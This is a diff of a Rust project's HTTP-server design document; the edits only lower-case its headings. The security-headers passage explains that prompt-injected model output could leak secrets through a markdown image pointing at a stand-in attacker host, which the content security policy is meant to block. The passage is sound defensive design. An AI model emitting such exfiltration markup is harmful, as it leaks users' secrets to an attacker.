@@ -1,4 +1,4 @@
-# HTTP Server
+# HTTP server
 
 The core runs one HTTP server (PLAN section 9) for web chat, the admin pages, and the login flow. It
 lives in `giles_core::http`, is built on `axum`, renders pages with `askama` templates compiled into
@@ -30,7 +30,7 @@ the shutdown token (`stream.take_until(token.cancelled_owned())`). The drain dea
 backstop, and without it one open event stream would hang shutdown forever, since `axum`'s graceful
 shutdown waits for every open request.
 
-## Extending the Router
+## Extending the router
 
 `http::RouterBuilder` is the one place routes are added:
 
@@ -55,7 +55,7 @@ Rules for a module's `routes(..) -> axum::Router`:
 - Render pages with `http::render(&page)`: HTML with `text/html; charset=utf-8`, or a logged error
   and a bare 500.
 
-## Pages and Templates
+## Pages and templates
 
 Templates live in `crates/giles-core/templates/` (askama's default directory) and are compiled into
 the binary by `#[derive(askama::Template)]`; a template error is a compile error.
@@ -85,9 +85,9 @@ The layout also sets `htmx`'s configuration through a `<meta name="htmx-config">
   Giles never sends any, so this only matters if something slips through the renderer.
 
 The home page (`index.html`) shows the version; it's `/` only when no web channel is configured
-(with one, `/` is the chat list: [Web Channel](web-channel.md)). `not_found.html` is the 404 page.
+(with one, `/` is the chat list: [Web channel](web-channel.md)). `not_found.html` is the 404 page.
 
-## Static Assets
+## Static assets
 
 `http::assets` serves files embedded with `include_bytes!`, from memory, under `/static/`:
 
@@ -105,7 +105,7 @@ files carry the first 16 hex digits of their SHA-256 (`assets::stylesheet_path()
 stale copy across an upgrade. `HEAD` works on every asset; any other method is a 405, and an unknown
 path under `/static/` gets the 404 page.
 
-### Vendored Files
+### Vendored files
 
 Both come from the npm registry, are licensed 0BSD (each directory holds its upstream `LICENSE`),
 and are committed exactly as published:
@@ -129,7 +129,7 @@ download the release tarball, compare it with `dist.integrity`
 (`curl -s https://registry.npmjs.org/<package>/<version> | jq .dist`), copy the file and its
 `LICENSE` into a new versioned directory, and update the `Asset` constant, this table, and the test.
 
-## Security Headers
+## Security headers
 
 `RouterBuilder::build` wraps the whole router (merged routes, the 404 fallback, and `axum`'s own 405
 responses) in an `axum::middleware::map_response` layer that sets:
@@ -154,7 +154,7 @@ Why each part:
 
 - The threat that matters most is agent output: model text is attacker-influenced (prompt
   injection), and the web channel renders it as HTML. The renderer (see
-  [Rendering Model Output](rendering.md)) already escapes raw HTML and drops remote images; the
+  [Rendering model output](rendering.md)) already escapes raw HTML and drops remote images; the
   policy is the second wall.
 - `img-src 'self' data:` (PLAN section 9): a reply like `![](https://attacker/?d=<secret>)` would
   leak data with no tool call. Images come only from this origin (`/blobs/<sha256>`) and `data:`
